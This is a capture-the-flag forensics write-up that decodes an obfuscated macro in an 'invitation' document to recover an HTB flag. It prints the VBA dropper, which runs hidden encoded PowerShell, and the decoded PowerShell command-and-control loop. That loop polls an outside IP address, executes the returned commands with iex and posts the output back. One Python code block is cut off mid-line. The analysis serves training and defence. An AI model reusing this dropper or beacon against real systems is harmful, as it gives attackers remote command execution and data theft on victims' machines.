
### Type: Forensics

### Challenge: Halloween Invitation


We get a document to open so make sure you have libreoffice or something similar installed and ready to view it.

Interestingly my program detects macros.

![image](https://user-images.githubusercontent.com/105310322/197890329-79cefff7-fe4c-4824-adfe-f75cd4689d13.png)


Taking a look at the macros reveals alot obfuscated data.

Note: Macros are located at tools > macros > edit macros

```

Sub lmavedb()
dropPath = Environ("TEMP")
Set rxnnvnfqufrzqfhnff = CreateObject(uxdufnkjlialsyp("536372697074696e672e46696c6553797374") & uxdufnkjlialsyp("656d4f626a656374"))
Set ktmlmpc = rxnnvnfqufrzqfhnff.OpenTextFile(dropPath & uxdufnkjlialsyp("5c68") & uxdufnkjlialsyp("6973746f72792e62616b"))
secret = ktmlmpc.ReadAll
ktmlmpc.Close
Code = "powershell -WindowStyle hidden -e """ & secret
x = Shell(Code, 1)
End Sub
```

Some of this can be decoded rather easily as it is just hex, however the meat of the data is with all of the numbers and will take some work to decode.

So what I did was opened up my Visual Studio Code for editing and CyberChef to handle my conversions.


First things first I started from ```fxnrfzsdxmcvranp``` where it has the numbers and took that entire portion. Then I edited it until it looked like this.

I looked for a good int to chr converter but I actually could not find one. Instead I made my own simple and ugly one with python :)

Now even this part was not perfect because in the above conversion to integer some of the data got messed up. I soon noticed that the integers needed to be fixed.

```Ex. 11865 = 118, 65``` or ```Ex. 10365 = 103,65```

This took some time to manually go through and edit each of them. I am sure there is a faster way but VS was pretty good about it.


After fixing it all my messy python code was ready to rock.

```python

output = Now lets run this baby through CyberChef one last time!

Finally we get some readable code!

```
$.s.=.'.7.7...7.4...1.9.8...5.2.:.8.0.8.0.'.;.$.i.=.'.d.4.3.b.c.c.6.d.-.0.4.3.f.2.4.0.9.-.7.e.a.2.3.a.2.c.'.;.$.p.=.'.h.t.t.p.:././.'.;.$.v.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.d.4.3.b.c.c.6.d. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}.;.w.h.i.l.e. .(.$.t.r.u.e.).{.$.c.=.(.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.s.e.B.a.s.i.c.P.a.r.s.i.n.g. .-.U.r.i. .$.p.$.s./.0.4.3.f.2.4.0.9. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}.).;.i.f. .(.$.c. .-.n.e. .'.N.o.n.e.'.). .{.$.r.=.i.e.x. .$.c. .-.E.r.r.o.r.A.c.t.i.o.n. .S.t.o.p. .-.E.r.r.o.r.V.a.r.i.a.b.l.e. .e.;.$.r.=.O.u.t.-.S.t.r.i.n.g. .-.I.n.p.u.t.O.b.j.e.c.t. .$.r.;.$.t.=.I.n.v.o.k.e.-.R.e.s.t.M.e.t.h.o.d. .-.U.r.i. .$.p.$.s./.7.e.a.2.3.a.2.c. .-.M.e.t.h.o.d. .P.O.S.T. .-.H.e.a.d.e.r.s. .@.{.".A.u.t.h.o.r.i.z.a.t.i.o.n.".=.$.i.}. .-.B.o.d.y. .(.[.S.y.s.t.e.m...T.e.x.t...E.n.c.o.d.i.n.g.].:.:.U.T.F.8...G.e.t.B.y.t.e.s.(.$.e.+.$.r.). .-.j.o.i.n. .'. .'.).}. .s.l.e.e.p. .0...8.}.H.T.B.{.5.u.p.3.r._.3.4.5.y._.m.4.c.r.0.5.}.
```

And hiding at the end is our flag! ```HTB{5up3r_345y_m4cr05}```

After doing this I learned of a much quicker way but you may not learn anything from it.

Download the file from the link provided. There are multiple ways to run it but I chose the easy install with the docker.(Just make sure to install docker.io) ```sudo apt install docker.io```

https://github.com/decalage2/ViperMonkey

Run the program.

```console
└─$ sudo ./dockermonkey.sh invitation.docm
```

After it goes through its process you should get a zip file that is password protected. The password is ```infected``` which I got from the github.

In the files should be the same base64 data. So just take that and decode it with cyberchef and you will have the flag.

GG and Happy Hunting!
